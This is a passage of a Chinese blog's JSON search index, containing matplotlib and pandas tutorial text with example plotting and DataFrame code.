","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:8","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"箱型图 # 读取数据集 df = pd.read_excel('tips.xlsx','sheet1') # 绘制散点图证明推论：小费随着总账单的递增而递增 # df.plot(kind='scatter',x='tip',y='total_bill',c='red',label='bill_tip') # 绘制箱型图 # 计算小费占总账单的比例 df['pct'] = df.tip / df.total_bill * 100 # print(df) # 过滤出小费占比比较高的人群,例如：30%以上 print(df[df.pct \u003e 30]) # 删除异常数据,按照索引删除 df = df.drop([67,172,178]) # print(df) # 打印箱型图 df.pct.plot(kind='box',label='tips pct%') # 绘制 plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:9","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"常用函数 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:6:0","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"绘制图表组成元素的主要函数 plot()——展现量的变化趋势 import matplotlib.pyplot as plt import numpy as np import pandas as pd x = np.linspace(1, 10, 1000) y = np.cos(x) # ls 曲线类型 lw曲线粗细 lable 图例名称 plt.plot(x, y, ls=\"--\", lw=5, label=\"plot figure\") plt.legend() plt.show() scatter()——寻找变量之间的关系 #encoding=utf-8 import matplotlib.pyplot as plt import numpy as np x = np.linspace(1,10,1000) y = np.random.rand(1000) # ls 曲线类型 lw曲线粗细 lable 图例名称 plt.scatter(x,y,label=\"scatter figure\") plt.legend() plt.show() xlim()——设置x轴的数值显示范围 #encoding=utf-8 import matplotlib.pyplot as plt import numpy as np x = np.linspace(1,10,1000) y = np.random.rand(1000) # ls 曲线类型 lw曲线粗细 lable 图例名称 plt.scatter(x,y,label=\"scatter figure\") plt.xlim(0.01,10) plt.ylim(0,1) plt.legend() plt.show() xlabel()——设置x轴的标签文本 import numpy as np import matplotlib.pyplot as plt import matplotlib x = np.linspace(0.05, 10, 1000) y = np.sin(x) plt.plot(x, y, ls=\"--\", lw=2, c=\"c\", label=\"plot figure\") plt.legend() plt.xlabel(\"x-axis\") plt.ylabel(\"y-axis\") plt.show() grid()——绘制刻度线的网格线 import numpy as np import matplotlib.pyplot as plt import matplotlib x = np.linspace(0.05, 10, 1000) y = np.sin(x) plt.plot(x, y, ls=\"--\", lw=2, c=\"c\", label=\"plot figure\") plt.legend() plt.grid(linestyle=\"-\",color=\"r\") plt.show() axhline()——绘制平行于x轴的水平参考线 import numpy as np import matplotlib.pyplot as plt import matplotlib x = np.linspace(0.05, 10, 1000) y = np.sin(x) plt.plot(x, y, ls=\"--\", lw=2, c=\"c\", label=\"plot figure\") plt.legend() plt.axhline(y=0.0,c=\"r\",ls=\":\",lw=2) plt.axvline(x=4.0,c=\"r\",ls=\":\",lw=2) plt.show() axvspan()——绘制垂直于x轴的参考区域 import numpy as np import matplotlib.pyplot as plt import matplotlib x = np.linspace(0.05, 10, 1000) y = np.sin(x) plt.plot(x, y, ls=\"--\", lw=2, c=\"c\", label=\"plot figure\") plt.legend() plt.axhspan(ymin=0.0,ymax=0.5,facecolor=\"y\",alpha=0.3) plt.axvspan(xmin=4.0,xmax=6.0,facecolor=\"y\",alpha=0.3) plt.show() annotate()——添加图形内容细节的指向型注释文本 import numpy as np import matplotlib.pyplot as plt import matplotlib x = np.linspace(0.05, 10, 1000) y = np.sin(x) plt.plot(x, y, ls=\"--\", lw=2, c=\"c\", label=\"plot figure\") plt.legend() plt.annotate( # 文字描述 s = \"maximum\", # 设置xy坐标点 xy=(np.pi / 2 ,1.0), xytext=((np.pi / 2) + 1.0, 0.8), weight=\"bold\", c=\"b\", arrowprops=dict(arrowstyle=\"-\u003e\", connectionstyle=\"arc3\", color=\"b\" )) plt.show() text()——添加图形内容细节的无指向型注释文本 import numpy as np import matplotlib.pyplot as plt import matplotlib x = np.linspace(0.05, 10, 1000) y = np.sin(x) plt.plot(x, y, ls=\"--\", lw=2, c=\"c\", label=\"plot figure\") plt.legend() plt.annotate( # 文字描述 s = \"maximum\", # 设置xy坐标点 xy=(np.pi/2,1.0), xytext=((np.pi / 2) + 1.0, 0.8), weight=\"bold\", c=\"b\", arrowprops=dict(arrowstyle=\"-\u003e\", connectionstyle=\"arc3\", color=\"b\" )) # text() plt.text(x=3.10,y=0.09,s=\"y=sin(x)\",weight=\"bold\", c=\"b\") plt.show() title()——添加图形内容的标题 import numpy as np import matplotlib.pyplot as plt import matplotlib x = np.linspace(0.05, 10, 1000) y = np.sin(x) plt.plot(x, y, ls=\"--\", lw=2, c=\"c\", label=\"plot figure\") plt.legend() plt.title(\"center\") plt.title(\"left\",loc=\"left\",fontdict={\"size\": \"xx-large\", \"color\": \"r\", \"family\": \"Times New Roman\"}) plt.title(\"right\",loc=\"right\",family=\"Comic Sans MS\", size=20, style=\"oblique\", color=\"c\") plt.show() legend()——表示不同图形的文本标签图例 import numpy as np import matplotlib.pyplot as plt import matplotlib x = np.arange(0,3,0.1) y1 = np.power(x,3) y2 = np.power(x,2) y3 = np.power(x,1) plt.plot(x,y1,c=\"r\",ls=\"-\", lw=2, label=\"$x^3$\") plt.plot(x,y2,c=\"b\",ls=\"-\", lw=2, label=\"$x^2$\") plt.plot(x,y3,c=\"y\",ls=\"-\", lw=2, label=\"$x^1$\") plt.legend(loc=\"upper left\",fontsize=\"x-large\",bbox_to_anchor=(0.05, 0.95), ncol=3, title=\"power function\", shadow=True, fancybox=True) plt.show() \"\"\" loc参数控制图例的位置，可选值为 best upper right upper left lower left lower right right center left center right lower center upper center center ontsize控制图例字体大小，可选值为 int float xx-small x-small small medium large x-large xx-large \"\"\" ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:6:1","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"常用配置参数 点标记类型 marker，只能用以下简写符号表示 marker 可以定义的符号如下： 标记 符号 描述 “.” 点 “,” 像素点 “o” 实心圆 “v” 下三角 “^” 上三角 “\u003c” 左三角 “\u003e” 右三角 “1” 下三叉 “2” 上三叉 “3” 左三叉 “4” 右三叉 “8” 八角形 “s” 正方形 “p” 五边形 “P” 加号（填充） “*” 星号 “h” 六边形 1 “H” 六边形 2 “+” 加号 “x” 乘号 x “X” 乘号 x (填充) “D” 菱形 “d” 瘦菱形 “|” 竖线 “_” 横线 0 (TICKLEFT) 左横线 1 (TICKRIGHT) 右横线 2 (TICKUP) 上竖线 3 (TICKDOWN) 下竖线 4 (CARETLEFT) 左箭头 5 (CARETRIGHT) 右箭头 6 (CARETUP) 上箭头 7 (CARETDOWN) 下箭头 8 (CARETLEFTBASE) 左箭头 (中间点为基准) 9 (CARETRIGHTBASE) 右箭头 (中间点为基准) 10 (CARETUPBASE) 上箭头 (中间点为基准) 11 (CARETDOWNBASE) 下箭头 (中间点为基准) “None”, \" \" or \"\" 没有任何标记 ‘$…$’ 渲染指定的字符。例如 “$f$” 以字母 f 为标记。 import matplotlib.pyplot as plt import numpy as np ypoints = np.array([1,3,4,5,8,9,6,1,3,4,5,2,4]) plt.plot(ypoints, marker = '*') plt.show() 我们也可以自定义标记的大小与颜色，使用的参数分别是： markersize，简写为 ms：定义标记的大小。 markerfacecolor，简写为 mfc：定义标记内部的颜色。 markeredgecolor，简写为 mec：定义标记边框的颜色。 import matplotlib.pyplot as plt import numpy as np ypoints = np.array([6, 2, 13, 10]) plt.plot(ypoints, marker = 'o', ms = 20) plt.show() fmt 参数 fmt 参数定义了基本格式，如标记、线条样式和颜色。 fmt = '[marker][line][color]' 例如 o:r，o 表示实心圆标记，: 表示虚线，r 表示颜色为红色。 import matplotlib.pyplot as plt import numpy as np ypoints = np.array([6, 2, 13, 10]) plt.plot(ypoints, 'o:r') plt.show() 线类型：linestyle 线类型标记 描述 ‘-’ 实线 ‘:’ 虚线 ‘–’ 破折线 ‘-.’ 点划线 颜色类型： 颜色标记 描述 ‘r’ 红色 ‘g’ 绿色 ‘b’ 蓝色 ‘c’ 青色 ’m' 品红 ‘y’ 黄色 ‘k’ 黑色 ‘w’ 白色 也可以对关键字参数color赋十六进制的RGB字符串如 color=’#900302’ ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:6:2","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"绘图线 线宽 线的宽度可以使用 linewidth 参数来定义，简写为 lw，值可以是浮点数，如：1、2.0、5.67 等。 import matplotlib.pyplot as plt import numpy as np ypoints = np.array([6, 2, 13, 10]) plt.plot(ypoints, linewidth = '12.5') plt.show() 线类型 线类型：linestyle import matplotlib.pyplot as plt import numpy as np ypoints = np.array([6, 2, 13, 10]) plt.plot(ypoints, linestyle = 'dotted') # 简写 # plt.plot(ypoints, ls = '-.') plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:6:3","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"线的颜色 线的颜色可以使用 color 参数来定义，简写为 c。 import matplotlib.pyplot as plt import numpy as np ypoints = np.array([6, 2, 13, 10]) plt.plot(ypoints, c = '#8FBC8F') plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:6:4","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"多条线 import matplotlib.pyplot as plt import numpy as np y1 = np.array([3, 7, 5, 9]) y2 = np.array([6, 2, 13, 10]) plt.plot(y1) plt.plot(y2) plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:6:5","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"多图 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:7:0","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"subplot() subplot() 方法在绘图时需要指定位置 mport matplotlib.pyplot as plt import numpy as np #plot 1: x = np.array([0, 6]) y = np.array([0, 100]) plt.subplot(2, 2, 1) plt.plot(x,y) plt.title(\"plot 1\") #plot 2: x = np.array([1, 2, 3, 4]) y = np.array([1, 4, 9, 16]) plt.subplot(2, 2, 2) plt.plot(x,y) plt.title(\"plot 2\") #plot 3: x = np.array([1, 2, 3, 4]) y = np.array([3, 5, 7, 9]) plt.subplot(2, 2, 3) plt.plot(x,y) plt.title(\"plot 3\") #plot 4: x = np.array([1, 2, 3, 4]) y = np.array([4, 5, 6, 7]) plt.subplot(2, 2, 4) plt.plot(x,y) plt.title(\"plot 4\") plt.suptitle(\"RUNOOB subplot Test\") plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:7:1","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"subplots() subplots() 方法可以一次生成多个，在调用时只需要调用生成对象的 ax 即可 import matplotlib.pyplot as plt import numpy as np # 创建一些测试数据 -- 图1 x = np.linspace(0, 2*np.pi, 400) y = np.sin(x**2) # 创建一个画像和子图 -- 图2 fig, ax = plt.subplots() ax.plot(x, y) ax.set_title('Simple plot') # 创建两个子图 -- 图3 f, (ax1, ax2) = plt.subplots(1, 2, sharey=True) ax1.plot(x, y) ax1.set_title('Sharing Y axis') ax2.scatter(x, y) # 创建四个子图 -- 图4 fig, axs = plt.subplots(2, 2, subplot_kw=dict(projection=\"polar\")) axs[0, 0].plot(x, y) axs[1, 1].scatter(x, y) # 共享 x 轴 plt.subplots(2, 2, sharex='col') # 共享 y 轴 plt.subplots(2, 2, sharey='row') # 共享 x 轴和 y 轴 plt.subplots(2, 2, sharex='all', sharey='all') # 这个也是共享 x 轴和 y 轴 plt.subplots(2, 2, sharex=True, sharey=True) # 创建10 张图，已经存在的则删除 fig, ax = plt.subplots(num=10, clear=True) plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:7:2","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"后记 一堂学下来，感觉很多东西乱糟糟的。个人感觉还是记住最基本的流程和最常用的，把常用的多动手练习，至于剩下的用到的时候再查。 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:8:0","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"简介 pandas是基于NumPy的一种数据分析工具，在机器学习任务中，我们首先需要对数据进行清洗和编辑等工作，pandas库大大简化了我们的工作量，熟练并掌握pandas常规用法是正确构建机器学习模型的第一步。 为什么要学习pandas？ numpy能够帮我们处理处理数值型数据，但是这还不够，很多时候，我们的数据除了数值之外，还有字符串，还有时间序列等 比如：我们通过爬虫获取到了存储在数据库中的数据，除了数值之外还有国家的信息，视频的分类(tag)信息，标题信息等 所以，numpy能够帮助我们处理数值，但是pandas除了处理数值之外(基于numpy)，还能够帮助我们处理其他类型的数据 ① pandas一般解决表格型的数据、二维的。 ② pandas是专门为处理表格和混杂数据设计的，而Numpy更适合处理统一数值数据。 ③ pandas主要数据结构：Series 和 DataFrame ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:1:0","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"Pandas安装 pip install pandas 导入包： import numpy as np # pandas和numpy常常结合在一起使用，导入numpy库 import pandas as pd # 官方推荐用别名pd print(pd.__version__) # 打印pandas版本信息 一个简单的 pandas 实例： import pandas as pd mydataset = { 'sites': [\"Google\", \"Runoob\", \"Wiki\"], 'number': [1, 2, 3] } myvar = pd.DataFrame(mydataset) print(myvar) \"\"\" 输出： sites number 0 Google 1 1 Runoob 2 2 Wiki 3 \"\"\" ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:2:0","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"pandas数据类型 pandas包含两种数据类型：series和dataframe。 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:3:0","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"series series是一种一维数据结构，每一个元素都带有一个索引，与一维数组的含义相似，可以保存任何数据类型。其中索引可以为数字或字符串。 series结构名称：|索引列|数据列 创建Series： 函数如下： pandas.Series(data, index, dtype, name, copy) \"\"\" 参数说明： data：一组数据(ndarray 类型)。 index：数据索引标签，如果不指定，默认从 0 开始。 dtype：数据类型，默认会自己判断。 name：设置名称。 copy：拷贝数据，默认为 False。 \"\"\" 1.创建一个空的Series对象 import pandas as pd #输出数据为空 s = pd.Series() print(s) 2.ndarray创建Series对象 ndarray 是 NumPy 中的数组类型，当 data 是 ndarry 时，传递的索引必须具有与数组相同的长度。假如没有给 index 参数传参，在默认情况下，索引值将使用是 range(n) 生成，其中 n 代表数组长度，如下所示： import pandas as pd import numpy as np data = np.array(['a','b','c','d']) s = pd.Series(data) # 不指定索引，默认从0开始到len-1 # s = pd.Series(data,index=[100,101,102,103]) # “显式索引”的方法定义索引标签 # 命名索引列名称 s.name = 'alphabets' print(s) \"\"\" 输出 0 a 1 b 2 c 3 d dtype: object \"\"\" 3.dict创建Series对象 把 dict 作为输入数据。如果没有传入索引时会按照字典的键来构造索引；反之，当传递了索引时需要将索引标签与字典中的值一一对应。 3.1没有传递索引时： import pandas as pd import numpy as np data = {'a' : 0., 'b' : 1., 'c' : 2.} s = pd.Series(data) print(s) 3.2为index参数传递索引时： import pandas as pd import numpy as np data = {'a' : 0., 'b' : 1., 'c' : 2.} s = pd.Series(data,index=['b','c','d','a']) print(s) # 当传递的索引值无法找到与其对应的值时，使用 NaN（非数字）填充。 如何从列表，数组，字典构建series： mylist = list('abcedfghijklmnopqrstuvwxyz') # 列表 myarr = np.arange(26) # 数组 mydict = dict(zip(mylist, myarr)) # 字典（key变成了索引） # 构建方法 ser1 = pd.Series(mylist) ser2 = pd.Series(myarr) ser3 = pd.Series(mydict) print(ser3.head()) # 打印前5个数据 #\u003e a 0 b 1 c 2 d 4 e 3 dtype:int64 4.标量创建Series对象 如果 data 是标量值，则必须提供索引 import pandas as pd import numpy as np s = pd.Series(5, index=[0, 1, 2, 3]) print(s) # 标量值按照 index 的数量进行重复，并与其一一对应。 访问Series数据 1.位置索引访问 import pandas as pd s = pd.Series([1,2,3,4,5],index = ['a','b','c','d','e']) print(s[0]) #位置下标 print(s['a']) #标签下标 通过切片的方式访问 Series 序列中的数据，示例如下： import pandas as pd s = pd.Series([1,2,3,4,5],index = ['a','b','c','d','e']) print(s[:3]) # 如果想要获取最后三个元素 print(s[-3:]) 2.索引标签访问 import pandas as pd s = pd.Series([6,7,8,9,10],index = ['a','b','c','d','e']) # 使用索标签访问单个元素值： print(s['a']） # 使用索标签访问多个元素值： print(s[['a','c','d']]) # 如果使用了 index 中不包含的标签，则会触发异常： Series常用属性 \"\"\" 名称 属性 axes 以列表的形式返回所有行索引标签。 dtype 返回对象的数据类型。 empty 返回一个空的 Series 对象。返回一个布尔值，用于判断数据对象是否为空 ndim 返回输入数据的维数。根据定义，Series 是一维数据结构，因此它始终返回 1。 size 返回输入数据的元素数量。 values 以 ndarray 的形式返回 Series 对象。 index 返回一个RangeIndex对象，用来描述索引的取值范围。 \"\"\" Series常用方法 1) head()\u0026tail()查看数据 其中 head() 返回前 n 行数据，默认显示前 5 行数据； tail() 返回的是后 n 行数据，默认为后 5 行。 print (s.head(3)) print (s.tail(2)) 2) isnull()\u0026nonull()检测缺失值 isnull()：如果值不存在或者缺失，则返回 True。 notnull()：如果值不存在或者缺失，则返回 False。 其它 如何使series的索引列转化为dataframe的列 mylist = list('abcedfghijklmnopqrstuvwxyz') myarr = np.arange(26) mydict = dict(zip(mylist, myarr)) ser = pd.Series(mydict) # series转换为dataframe df = ser.to_frame() # 索引列转换为dataframe的列 df.reset_index(inplace=True) print(df.head()) #\u003e index 0 0 a 0 1 b 1 2 c 2 3 e 3 4 d 4 结合多个series组成dataframe: # 构建series1 ser1 = pd.Series(list('abcedfghijklmnopqrstuvwxyz')) # 构建series2 ser2 = pd.Series(np.arange(26)) # 方法1，axis=1表示列拼接，0表示行拼接 df = pd.concat([ser1, ser2], axis=1) # 与方法1相比，方法2设置了列名 df = pd.DataFrame({'col1': ser1, 'col2': ser2}) print(df.head()) #\u003e col1 col2 0 a 0 1 b 1 2 c 2 3 e 3 4 d 4 获得series对象A中不包含series对象B的元素: ser1 = pd.Series([1, 2, 3, 4, 5]) ser2 = pd.Series([4, 5, 6, 7, 8]) # 返回ser1不包含ser2的布尔型series ser3=~ser1.isin(ser2) # 获取ser不包含ser2的元素 ser1[ser3] #\u003e 0 1 1 2 2 3 dtype: int64 获得seriesA和seriesB不相同的项: ser1 = pd.Series([1, 2, 3, 4, 5]) ser2 = pd.Series([4, 5, 6, 7, 8]) # 求ser1和ser2的并集 ser_u = pd.Series(np.union1d(ser1, ser2)) # 求ser1和ser2的交集 ser_i = pd.Series(np.intersect1d(ser1, ser2)) # ser_i在ser_u的补集就是ser1和ser2不相同的项 ser_u[~ser_u.isin(ser_i)] #\u003e 0 1 1 2 2 3 5 6 6 7 7 8 dtype: int64 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:3:1","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"dataframe dataframe是一种二维数据结构，数据以表格形式（与excel类似）存储，有对应的行和列。DataFrame 既有行索引(index)也有列索引(columns)，表格中每列的数据类型可以不同，比如可以是字符串、整型或者浮点型等。 DataFrame 的每一行数据都可以看成一个 Series 结构，只不过，DataFrame 为这些行中每个数据值增加了一个列标签。因此 DataFrame 其实是从 Series 的基础上演变而来。在数据分析任务中 DataFrame 的应用非常广泛，因为它描述数据的更为清晰、直观。 dataframe结构名称： DataFrame 数据结构的特点简单总结： DataFrame 每一列的标签值允许使用不同的数据类型； DataFrame 是表格型的数据结构，具有行和列； DataFrame 中的每个数据值都可以被修改。 DataFrame 结构的行数、列数允许增加或者删除； DataFrame 有两个方向的标签轴，分别是行标签和列标签； DataFrame 可以对行和列执行算术运算。 创建DataFrame对象 DataFrame 构造方法如下： pandas.DataFrame( data, index, columns, dtype, copy) \"\"\" 参数说明： data：一组数据(ndarray、series, map, lists, dict 等类型)。 index：索引值，或者可以称为行标签。 columns：列标签，默认为 RangeIndex (0, 1, 2, …, n) 。 dtype：数据类型。 copy：拷贝数据，默认为 False。 \"\"\" 主要有五种创建方式： 1.创建空的DataFame对象 import pandas as pd df = pd.DataFrame() print(df) 2.列表创建DataFame对象 单一列表创建 DataFrame： import pandas as pd data = [1,2,3,4,5] df = pd.DataFrame(data) print(df) 使用嵌套列表创建 DataFrame 对象： import pandas as pd data = [['Google',10],['Runoob',12],['Wiki',13]] #df = pd.DataFrame(data, columns=['Site','Age']) df = pd.DataFrame(data, columns=['Site','Age'], dtype=float) # 可以执行数值元素类型 print(df) 3.字典创建 data 字典中，键对应的值的元素长度必须相同（也就是列表长度相同）。如果传递了索引，那么索引的长度应该等于数组的长度；如果没有传递索引，那么默认情况下，索引将是 range(n)，其中 n 代表数组长度。 字典嵌套列表(ndarrays)创建： import pandas as pd data = {'Name':['Tom', 'Jack', 'Steve', 'Ricky'],'Age':[28,34,29,42]} df = pd.DataFrame(data) # 也可以添加自定义的行标签（index 参数为每行分配了一个索引） #df = pd.DataFrame(data, index=['rank1','rank2','rank3','rank4']) print(df) 4.列表嵌套字典创建DataFrame对象 列表嵌套字典可以作为输入数据传递给 DataFrame 构造函数。默认情况下，字典的键被用作列名。 import pandas as pd data = [{'a': 1, 'b': 2},{'a': 5, 'b': 10, 'c': 20}] df = pd.DataFrame(data) # df = pd.DataFrame(data, index=['first', 'second'], columns=['a', 'b1']) # 添加自定义行标签索引，列索引 print(df) # 没有对应的部分数据为 NaN。 5.Series创建DataFrame对象 import pandas as pd d = {'one' : pd.Series([1, 2, 3], index=['a', 'b', 'c']), 'two' : pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd'])} df = pd.DataFrame(d) print(df) # 其输出结果的行索引是所有 index 的合集 列索引操作DataFrame 使用列索（columns index）引来完成数据的选取、添加和删除操作。 1.列索引选取数据列 import pandas as pd d = {'one' : pd.Series([1, 2, 3], index=['a', 'b', 'c']), 'two' : pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd'])} df = pd.DataFrame(d) print(df['one']) # 只提取one列的数据 2.列索引添加数据列 import pandas as pd d = {'one' : pd.Series([1, 2, 3], index=['a', 'b', 'c']), 'two' : pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd'])} df = pd.DataFrame(d) # F1:使用df['列']=值方式，插入新的数据列 df['three']=pd.Series([10,20,30],index=['a','b','c']) print(df) #将已经存在的数据列做相加运算 df['four']=df['one']+df['three'] print(df) # F2:使用insert()插入新的列 # 注意是column参数 # 数值1代表插入到columns列表的索引位置 df.insert(1,column='score',value=[91,90,75]) print(df) 2.列索引删除数据列 # 通过 del 和 pop() 都能够删除 DataFrame 中的数据列。 import pandas as pd d = {'one' : pd.Series([1, 2, 3], index=['a', 'b', 'c']), 'two' : pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd']), 'three' : pd.Series([10,20,30], index=['a','b','c'])} df = pd.DataFrame(d) print (\"Our dataframe is:\") print(df) #使用del删除 del df['one'] print(df) #使用pop方法删除 df.pop('two') print (df) 行索引操作DataFrame 跟上述的列标签操作类似 1.标签索引选取 可以使用 loc 属性返回指定行的数据。 import pandas as pd d = {'one' : pd.Series([1, 2, 3], index=['a', 'b', 'c']), 'two' : pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd'])} df = pd.DataFrame(d) print(df.loc['b']) # loc 允许接两个参数分别是行和列，参数之间需要使用“逗号”隔开，但该函数只能接收标签索引。 2.整数索引选取 使用iloc 通过索引位置来选取，如果没有设置索引，默认第一行索引为 0，第二行索引为 1，以此类推: import pandas as pd d = {'one' : pd.Series([1, 2, 3], index=['a', 'b', 'c']), 'two' : pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd'])} df = pd.DataFrame(d) print (df.iloc[2]） # iloc 允许接受两个参数分别是行和列，参数之间使用“逗号”隔开，但该函数只能接收整数索引 3.切片操作多行选取 import pandas as pd d = {'one' : pd.Series([1, 2, 3], index=['a', 'b', 'c']), 'two' : pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd'])} df = pd.DataFrame(d) #左闭右开 print(df[2:4]) 4.添加数据行 使用 append() 函数，可以将新的数据行添加到 DataFrame 中，该函数会在行末追加数据行 import pandas as pd df = pd.DataFrame([[1, 2], [3, 4]], columns = ['a','b']) df2 = pd.DataFrame([[5, 6], [7, 8]], col","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:3:2","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"Pandas描述性统计 常用的统计函数： \"\"\" 函数名称 描述说明 count() 统计某个非空值的数量。 sum() 求和 mean() 求均值 median() 求中位数 mode() 求众数 std() 求标准差 min() 求最小值 max() 求最大值 abs() 求绝对值 prod() 求所有数值的乘积。 cumsum() 计算累计和，axis=0，按照行累加；axis=1，按照列累加。 cumprod() 计算累计积，axis=0，按照行累积；axis=1，按照列累积。 corr() 计算数列或变量之间的相关系数，取值-1到1，值越大表示关联性越强。 \"\"\" 在 DataFrame 中，使用聚合类方法时需要指定轴(axis)参数。下面介绍两种传参方式： 对行操作，默认使用 axis=0 或者使用 “index”； 对列操作，默认使用 axis=1 或者使用 “columns”。 如sum()求和：默认情况下，返回axis=0上数值的和 import pandas as pd import numpy as np #创建字典型series结构 d = {'Name':pd.Series(['小明','小亮','小红','小华','老赵','小曹','小陈', '老李','老王','小冯','小何','老张']), 'Age':pd.Series([25,26,25,23,30,29,23,34,40,30,51,46]), 'Rating':pd.Series([4.23,3.24,3.98,2.56,3.20,4.6,3.8,3.78,2.98,4.80,4.10,3.65]) } df = pd.DataFrame(d) #默认axis=0或者使用sum(\"index\") print(df.sum()) # axis为1的情况 #也可使用sum(\"columns\")或sum(1) print(df.sum(axis=1)) describe() 函数显示与 DataFrame 数据列相关的统计信息摘要。示例如下： import pandas as pd import numpy as np d = {'Name':pd.Series(['小明','小亮','小红','小华','老赵','小曹','小陈', '老李','老王','小冯','小何','老张']), 'Age':pd.Series([25,26,25,23,30,29,23,34,40,30,51,46]), 'Rating':pd.Series([4.23,3.24,3.98,2.56,3.20,4.6,3.8,3.78,2.98,4.80,4.10,3.65]) } #创建DataFrame对象 df = pd.DataFrame(d) #求出数据的所有描述信息 print(df.describe()) # 也可以使用include进行筛选： #object： 表示对字符列进行统计信息描述； #number：表示对数字列进行统计信息描述； #all：汇总所有列的统计信息。 print(df.describe(include=[\"object\"])) ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:4:0","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"Pandas绘图 Pandas 对 Matplotlib 绘图软件包的基础上单独封装了一个plot()接口，通过调用该接口可以实现常用的绘图操作。 Pandas 之所以能够实现了数据可视化，主要利用了 Matplotlib 库的 plot() 方法，它对 plot() 方法做了简单的封装，因此您可以直接调用该接口。 所以提前也应该安装matplotlib库。 例子： import pandas as pd import numpy as np # 创建包含时间序列的数据 df = pd.DataFrame(np.random.randn(8, 4), index=pd.date_range('2/1/2020', periods=8), columns=list('ABCD')) # df.plot() print(df) \"\"\" 数据如下： A B C D 2020-02-01 0.437235 